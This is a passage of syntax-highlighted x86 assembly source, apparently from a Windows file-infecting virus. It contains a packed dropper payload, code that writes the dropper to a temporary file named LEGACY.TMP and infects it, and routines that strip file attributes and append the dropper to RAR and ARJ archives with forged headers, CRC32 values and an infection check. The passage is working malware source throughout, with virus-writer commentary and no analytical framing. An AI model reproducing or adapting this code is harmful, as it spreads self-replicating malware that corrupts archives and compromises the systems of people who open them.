    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc0">
</span><span class="sc5">sdr0p</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dr0p</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">over_dropper</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sdr0p</span><span class="sc0">                       </span><span class="sc1">; Unpack in allocated memory</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; the dropper</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LSCE_UnPack</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; Create the dropper on</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">                       </span><span class="sc1">; a temporal file called</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000002h</span><span class="sc0">                       </span><span class="sc1">; LEGACY.TMP (that will be</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; erased later)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hate</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Write it, sucka!</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00001000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">o_tmp</span><span class="sc0">
</span><span class="sc5">hate</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LEGACY.TMP"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Infect the dropped file</span><span class="sc0">
</span><span class="sc5">o_tmp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectEDI</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Find's shit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hate</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindFirstFileA</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CantOpenArchive</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_FindClose</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hate</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFileArchive</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumBytesRead</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_ReadFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TMP_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get FileName to infect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">             </span><span class="sc1">; Wipe its attributes</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">                        </span><span class="sc1">; Open it</span><span class="sc0">

    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CantOpenArchive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetFileSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiveSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSION</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;       cmp     ecx,"RAR"</span><span class="sc0">
</span><span class="sc1">;       jz      InfectRAR</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc3">"JRA"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">InfectARJ</span><span class="sc0">

</span><span class="sc1">; -------------</span><span class="sc0">
</span><span class="sc1">; RAR Infection</span><span class="sc0">
</span><span class="sc1">; -------------</span><span class="sc0">

</span><span class="sc5">InfectRAR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; See if it was previously</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; infected...</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sRARHeaderSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">TryToInfectRAR</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumBytesRead</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50d</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiveBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_ReadFile</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">TryToInfectRAR</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiveBuffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc5">archive_mark</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseFileArchive</span><span class="sc0">

</span><span class="sc1">; Let's fill properly RAR fields :)</span><span class="sc0">

</span><span class="sc5">TryToInfectRAR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARName</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Generate a random 6 char name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateName</span><span class="sc0">                    </span><span class="sc1">; for the dr0pper ;)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARCompressed</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RAROriginal</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARCrc32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARHeader</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">sRARHeaderSize</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARHeaderCRC</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sRARHeaderSize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RARHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iobytes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CloseFileArchive</span><span class="sc0">

</span><span class="sc1">; -------------</span><span class="sc0">
</span><span class="sc1">; ARJ Infection</span><span class="sc0">
</span><span class="sc1">; -------------</span><span class="sc0">

</span><span class="sc5">InfectARJ</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Let's see if it was infected</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfDropperSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sARJTotalSize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc0">
